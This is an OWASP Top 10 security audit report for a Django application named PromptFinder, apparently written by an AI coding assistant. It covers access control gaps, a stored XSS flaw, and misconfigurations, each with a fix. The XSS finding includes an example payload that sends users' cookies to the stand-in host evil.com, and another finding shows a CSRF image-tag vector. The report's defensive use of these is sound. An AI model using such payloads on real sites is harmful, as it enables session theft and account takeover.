# OWASP Top 10 Security Assessment Report

**Project:** PromptFinder
**Assessment Date:** December 23, 2025
**Assessment Type:** Static Code Analysis + Configuration Review
**Scope:** Full Django Application (prompts_manager project)
**Report Version:** 2.0 (Updated based on @security-auditor review)

---

## Executive Summary

| Category | Risk Level | Findings | Critical Issues |
|----------|------------|----------|-----------------|
| A01 - Broken Access Control | **HIGH** | 6 | 3 |
| A02 - Cryptographic Failures | **LOW** | 0 | 0 |
| A03 - Injection | **HIGH** | 2 | 1 |
| A04 - Insecure Design | **LOW** | 2 | 0 |
| A05 - Security Misconfiguration | **MEDIUM** | 5 | 2 |
| A06 - Vulnerable Components | **LOW** | 0 | 0 |
| A07 - Auth Failures | **LOW** | 1 | 0 |
| A08 - Software/Data Integrity | **LOW** | 2 | 0 |
| A09 - Logging Failures | **LOW** | 2 | 0 |
| A10 - SSRF | **LOW** | 0 | 0 |

**Overall Security Posture:** GOOD (7/10) with Critical Gaps Requiring Immediate Action

**CRITICAL Findings (Fix Immediately):**
1. **STORED XSS** via `prompt.content|safe` without HTML sanitization (HIGH)
2. Missing `@login_required` on `prompt_like` view (CRITICAL)
3. Missing `@require_POST` on state-changing `prompt_like` view (MEDIUM)

**Priority Recommendations:**
1. Add HTML sanitization (bleach library) for user-submitted prompt content
2. Add `@login_required` and `@require_POST` to `prompt_like` view
3. Remove debug `print()` statements from production code
4. Fix template debug mode hardcoded to `True`
5. Replace raw exception exposure with generic error messages

---

## A01: Broken Access Control

### Risk Level: HIGH

### Findings

#### A01-F1: Missing Authentication on `prompt_like` View (CRITICAL)

**Location:** `prompts/views/api_views.py:59-103`

**Evidence:**
```python
def prompt_like(request, slug):
    """Handle AJAX requests to like/unlike AI prompts."""
    prompt = get_object_or_404(...)

    if prompt.likes.filter(id=request.user.id).exists():  # Assumes user is authenticated
        prompt.likes.remove(request.user)
        liked = False
    else:
        prompt.likes.add(request.user)
        liked = True
```

**Issue:** The `prompt_like` function lacks the `@login_required` decorator but directly accesses `request.user.id` on line 83. For anonymous users:
- Django's `AnonymousUser` has `id = None`
- `prompt.likes.filter(id=None)` will execute
- `prompt.likes.add(AnonymousUser)` will raise `ValueError` (cannot add AnonymousUser to ManyToMany)

**Risk:** CRITICAL - Causes server error for anonymous users, potential for like manipulation.

**Recommendation:** Add `@login_required` decorator.

---

#### A01-F2: Missing `@require_POST` on State-Changing View (MEDIUM)

**Location:** `prompts/views/api_views.py:59-103`

**Evidence:** The `prompt_like` view changes state (adds/removes likes) but accepts GET requests.

**Attack Vectors:**
1. **CSRF via image tags:** `<img src="/prompt/target-slug/like/">`
2. **Search engine crawlers** triggering likes when indexing
3. **Browser prefetch** triggering likes unintentionally

**Risk:** MEDIUM - Unintended state changes through GET requests.

**Recommendation:** Add `@require_POST` decorator (from `django.views.decorators.http`).

---

#### A01-F3: Manual Staff Check Instead of Decorator

**Location:** `prompts/views/api_views.py:109-174`

**Evidence:**
```python
def prompt_move_up(request, slug):
    if not request.user.is_staff:
        messages.error(request, 'Permission denied.')
        return redirect('prompts:home')
```

**Issue:** Manual permission checks (lines 114, 149, 184, 220) instead of using `@staff_member_required` decorator. While functional, this pattern is error-prone and inconsistent with other views.

**Risk:** LOW - Currently functional but could lead to bypasses if copy-pasted incorrectly.

**Recommendation:** Use `@staff_member_required` decorator for consistency.

---

#### A01-F4: IDOR Risk in Prompt Management (SECURE)

**Location:** Multiple views in `prompts/views/prompt_views.py`

**Evidence:**
```python
# Lines 1227, 1421, 1470 properly filter by author
prompt = get_object_or_404(Prompt, slug=slug, author=request.user)
```

**Issue:** VERIFIED SECURE - Edit, delete, and restore operations properly filter by `author=request.user`, preventing Insecure Direct Object Reference attacks.

**Risk:** NONE - Properly implemented.

---

#### A01-F5: CSP Exemption on Upload Views (DOCUMENTED)

**Location:** `prompts/views/upload_views.py:13`

**Evidence:**
```python
from csp.decorators import csp_exempt
```

**Issue:** CSP (Content Security Policy) is bypassed for upload views to allow Cloudinary widget functionality. This is a documented and accepted tradeoff.

**Risk:** LOW - Expected behavior, documented in CLAUDE.md under "Decisions Made" (#8).

---

#### A01-F6: Staff IDOR in Ordering API (LOW)

**Location:** `prompts/views/api_views.py` - Staff-only views

**Evidence:**
```python
def prompt_move_up(request, slug):
    prompt = get_object_or_404(Prompt, slug=slug)  # No author filter
```

**Issue:** Staff-only views (`prompt_move_up`, `prompt_move_down`, `prompt_set_order`) allow ANY staff member to modify ANY prompt's ordering, regardless of author.

**Risk:** LOW - Staff-only, but could allow staff to disrupt other staff's content ordering. Consider if this is intended behavior.

---

### A01 Summary

| Finding | Severity | Status |
|---------|----------|--------|
| A01-F1: Missing auth on prompt_like | CRITICAL | Needs Fix |
| A01-F2: Missing @require_POST | MEDIUM | Needs Fix |
| A01-F3: Manual staff checks | LOW | Acceptable |
| A01-F4: IDOR in prompt management | NONE | Secure |
| A01-F5: CSP exemption on uploads | LOW | Documented |
| A01-F6: Staff IDOR in ordering | LOW | Review Needed |

---

## A02: Cryptographic Failures

### Risk Level: LOW

### Positive Security Measures Verified

**Secret Management:** SECURE
- `SECRET_KEY = os.environ.get('SECRET_KEY')` - Loaded from environment
- Development secrets in `env.py` and `scripts/env.py` are properly gitignored

**Session Security:** SECURE
- `SESSION_COOKIE_SECURE = not DEBUG` (line 327)
- `CSRF_COOKIE_SECURE = not DEBUG` (line 329)
- `SESSION_COOKIE_HTTPONLY = True` (line 331)
- `CSRF_COOKIE_HTTPONLY = True` (line 333)

**IP Hashing:** SECURE
- Uses `IP_HASH_PEPPER` environment variable with SHA-256
- Privacy-first implementation for view tracking

---

## A03: Injection

### Risk Level: HIGH

### Findings

#### A03-F1: STORED XSS via `|safe` Template Filter (HIGH)

**Location:** `prompts/templates/prompts/prompt_detail.html:280`

**Evidence:**
```html
{{ prompt.content|safe }}
```

**Analysis of Input Path:**
1. User submits prompt content via upload form (`upload_views.py:186, 296`)
2. Content passes through `ProfanityFilter` - checks for offensive WORDS only
3. **NO HTML sanitization** using bleach or similar library
4. Content stored raw in database
5. Rendered with `|safe` filter, disabling Django's auto-escaping

**Attack Vector:**
```html
<!-- Attacker submits as prompt content: -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Impact:**
- **Stored XSS** - Payload persists in database
- **Affects all viewers** of the prompt
- Can steal session cookies, redirect users, inject malicious content

**Risk:** HIGH - Classic stored XSS vulnerability with no sanitization.

**Recommendation:** Either:
1. Remove `|safe` filter if HTML rendering not needed
2. Add HTML sanitization on input using `bleach.clean()` with allowed tags whitelist
3. Use Django's `django.utils.html.escape()` before storage

---

#### A03-F2: Other `|safe` Filter Usages (REVIEWED)

| Location | Content Source | Risk |
|----------|----------------|------|
| `templates/admin/base_site.html:26` | Django messages (admin-controlled) | NONE |
| `templates/base.html:542` | Django messages with `extra_tags='safe'` | LOW |
| `about/templates/about/about.html:38` | Summernote content (admin-only) | LOW |
| `prompts/templates/prompts/edit_profile.html:25` | Django messages | NONE |
| `prompts/templates/prompts/upload_step2.html:199` | Server-generated warning | NONE |
| `prompts/templates/prompts/upload_step2.html:422` | JSON tags array (server-generated) | NONE |

---

#### A03-F3: SQL Injection (SECURE)

**Evidence:** No raw SQL queries found in project code. Django ORM is used consistently.

**Risk:** NONE - Properly implemented.

---

#### A03-F4: Command Injection (SECURE)

**Evidence:** No `subprocess`, `os.system`, `eval()`, or `exec()` found in project code.

**Risk:** NONE - Properly implemented.

---

### A03 Summary

| Finding | Severity | Status |
|---------|----------|--------|
| A03-F1: Stored XSS via prompt.content | HIGH | **Needs Fix** |
| A03-F2: Other |safe usages | LOW | Acceptable |
| A03-F3: SQL injection | NONE | Secure |
| A03-F4: Command injection | NONE | Secure |

---

## A04: Insecure Design

### Risk Level: LOW

### Findings

#### A04-F1: Rate Limiting Fail-Open Configuration

**Location:** `prompts_manager/settings.py:377`

**Evidence:**
```python
RATELIMIT_FAIL_OPEN = True  # Allow requests if cache down
```

**Issue:** Rate limiting fails open if cache is unavailable. Documented design decision for UX.

**Risk:** LOW - Acceptable tradeoff.

---

#### A04-F2: Testing Upload Limits in Production

**Location:** `prompts/views/upload_views.py:41-48`

**Evidence:**
```python
# TODO: Revert to 10 after testing phase
weekly_limit = 100  # Testing - was 10
```

**Issue:** Testing values still in production code.

**Risk:** LOW - Business logic, not security vulnerability.

---

## A05: Security Misconfiguration

### Risk Level: MEDIUM

### Findings

#### A05-F1: Debug Print Statements in Production Code (MEDIUM)

**Location:** `prompts/views/api_views.py:216-251`

**Evidence:**
```python
def bulk_reorder_prompts(request):
    print(f"DEBUG: bulk_reorder_prompts called - Method: {request.method}")
    print(f"DEBUG: User is staff: {request.user.is_staff}")
    print(f"DEBUG: Request body: {request.body}")
```

**Issue:** Debug `print()` statements leak sensitive information to server logs.

**Risk:** MEDIUM - Information disclosure.

**Recommendation:** Remove debug prints or use proper logging at DEBUG level.

---

#### A05-F2: Information Disclosure via Exception Messages (MEDIUM)

**Location:** `prompts/views/api_views.py:276`

**Evidence:**
```python
except Exception as e:
    return JsonResponse({'error': str(e)}, status=500)
```

**Issue:** Raw exception messages exposed to users, potentially revealing:
- Database structure
- Internal paths
- Third-party service information

**Risk:** MEDIUM - Information disclosure.

**Recommendation:** Return generic error message: `{'error': 'An unexpected error occurred'}`

---

#### A05-F3: Template Debug Mode Hardcoded (MEDIUM)

**Location:** `prompts_manager/settings.py:174`

**Evidence:**
```python
'OPTIONS': {
    'debug': True,  # ← Hardcoded, should be DEBUG variable
},
```

**Issue:** Template debug mode is hardcoded to `True`. In production, this:
- Shows detailed error pages with source code paths
- Exposes template source code in error messages
- Reveals stack traces with application internals

**Risk:** MEDIUM - Information disclosure in production.

**Recommendation:** Change to `'debug': DEBUG`

---

#### A05-F4: HSTS Configuration (SECURE)

**Location:** `prompts_manager/settings.py:102-115`

**Issue:** VERIFIED SECURE - HSTS properly configured for production only.

---

#### A05-F5: CSP Configuration (ACCEPTABLE)

**Location:** `prompts_manager/settings.py:420-482`

**Issue:** CSP includes `'unsafe-inline'` and `'unsafe-eval'` required for Cloudinary widget.

**Risk:** LOW - Acceptable tradeoff, documented.

---

### A05 Summary

| Finding | Severity | Status |
|---------|----------|--------|
| A05-F1: Debug prints in code | MEDIUM | Needs Fix |
| A05-F2: Exception message exposure | MEDIUM | Needs Fix |
| A05-F3: Template debug mode | MEDIUM | Needs Fix |
| A05-F4: HSTS configuration | NONE | Secure |
| A05-F5: CSP configuration | LOW | Documented |

---

## A06: Vulnerable and Outdated Components

### Risk Level: LOW

### Findings

#### A06-F1: Dependency Analysis (VERIFIED LOW RISK)

**Key Dependencies Verified:**
- Django >= 5.2.9 (current, no known CVEs)
- django-allauth 65.13.0 (recently updated for security - CVE-2025-65430, CVE-2025-65431)
- urllib3 >= 2.6.0 (addresses CVE-2024-37891)
- sentry-sdk >= 1.45.1 (current)

**CI Pipeline:** Includes `pip-audit` for automated vulnerability scanning.

**Risk:** LOW - Dependencies appear current.

---

## A07: Identification and Authentication Failures

### Risk Level: LOW

### Findings

#### A07-F1: Password Validation (SECURE)

All four Django password validators are enabled.

---

#### A07-F2: Email Verification Disabled

**Location:** `prompts_manager/settings.py:258`

**Evidence:** `ACCOUNT_EMAIL_VERIFICATION = 'none'`

**Issue:** Users can register with any email without verification.

**Risk:** LOW - Business decision.

---

## A08: Software and Data Integrity Failures

### Risk Level: LOW

### Findings

#### A08-F1: CSRF Protection (SECURE)

- CSRF middleware enabled
- No `@csrf_exempt` decorators found in project code
- CSRF tokens properly included in forms

---

#### A08-F2: Missing SRI for CDN Resources (LOW)

**Issue:** No Subresource Integrity (SRI) hashes for CDN-loaded scripts from jsdelivr.net or cdnjs.cloudflare.com. If these CDNs were compromised, malicious scripts could be injected.

**Risk:** LOW - Defense in depth enhancement.

**Recommendation:** Add SRI hashes to CDN script/link tags.

---

## A09: Security Logging and Monitoring Failures

### Risk Level: LOW

### Findings

#### A09-F1: Error Monitoring (SECURE)

Sentry error monitoring configured for production.

---

#### A09-F2: Security Event Logging (ENHANCEMENT)

Basic logging configured. Security events (failed logins, access violations) may not be explicitly logged.

**Recommendation:** Add explicit logging for authentication failures.

---

## A10: Server-Side Request Forgery (SSRF)

### Risk Level: LOW

### Findings

**VERIFIED SECURE:** No user-controlled URLs used in server-side HTTP requests. Cloudinary SDK handles all external communication with proper authentication.

---

## Prioritized Remediation Roadmap

### Critical (Fix Immediately)

| ID | Issue | Location | Effort |
|----|-------|----------|--------|
| A03-F1 | Stored XSS via prompt.content | prompt_detail.html:280 | 2 hours |
| A01-F1 | Missing @login_required on prompt_like | api_views.py:59 | 5 min |
| A01-F2 | Missing @require_POST on prompt_like | api_views.py:59 | 5 min |

### High (Fix Within 1 Week)

| ID | Issue | Location | Effort |
|----|-------|----------|--------|
| A05-F1 | Debug print statements | api_views.py:216-251 | 15 min |
| A05-F2 | Exception message exposure | api_views.py:276 | 10 min |
| A05-F3 | Template debug mode | settings.py:174 | 5 min |

### Medium (Fix Within 1 Month)

| ID | Issue | Location | Effort |
|----|-------|----------|--------|
| A07-F2 | Email verification | settings.py:258 | 2 hours |
| A08-F2 | Add SRI hashes | templates/base.html | 1 hour |
| A09-F2 | Security event logging | settings.py | 4 hours |

### Low (Track for Future)

| ID | Issue | Location | Effort |
|----|-------|----------|--------|
| A01-F3 | Manual staff checks | api_views.py | 30 min |
| A01-F6 | Staff IDOR in ordering | api_views.py | Review |

---

## Appendix A: Security Headers Verification

| Header | Status | Configuration |
|--------|--------|---------------|
| X-Content-Type-Options | ✅ Enabled | `SECURE_CONTENT_TYPE_NOSNIFF = True` |
| X-XSS-Protection | ✅ Enabled | `SECURE_BROWSER_XSS_FILTER = True` |
| X-Frame-Options | ✅ Enabled | `X_FRAME_OPTIONS = 'DENY'` |
| HSTS | ✅ Enabled (prod) | 1 year, include subdomains, preload |
| Content-Security-Policy | ✅ Enabled | Via django-csp middleware |
| Referrer-Policy | ✅ Enabled (prod) | strict-origin-when-cross-origin |

---

## Appendix B: Authentication Decorator Coverage

| View Module | Total Views | With Auth | Without Auth | Notes |
|-------------|-------------|-----------|--------------|-------|
| upload_views.py | 5 | 5 | 0 | All require login |
| admin_views.py | 5 | 5 | 0 | Staff required |
| prompt_views.py | 15+ | 6 | 9 | Public views intended |
| user_views.py | 6 | 4 | 2 | Profile views public |
| api_views.py | 5 | 0 | 5 | **Needs Review** |
| social_views.py | 3 | 2 | 1 | Follow requires auth |
| generator_views.py | 2 | 0 | 2 | Public views intended |

---

## Appendix C: Positive Security Measures

The application implements many security best practices:

- ✅ Django ORM used consistently (no SQL injection)
- ✅ CSRF protection enabled
- ✅ Password validators configured
- ✅ Session cookies secure and httponly
- ✅ HSTS properly configured for production
- ✅ CSP (Content Security Policy) enabled
- ✅ Sentry error monitoring
- ✅ Rate limiting implemented
- ✅ IP hashing for privacy
- ✅ Secrets loaded from environment variables
- ✅ Development secrets properly gitignored

---

## Report Metadata

- **Assessor:** Claude Code (AI Security Assessment)
- **Reviewer:** @security-auditor agent
- **Methodology:** Static code analysis, configuration review, pattern matching
- **Limitations:** No dynamic testing, no penetration testing
- **Report Version:** 2.0 (Updated with @security-auditor feedback)
- **Original Rating:** 7.5/10
- **Target Rating:** 8+/10

---

**END OF REPORT**
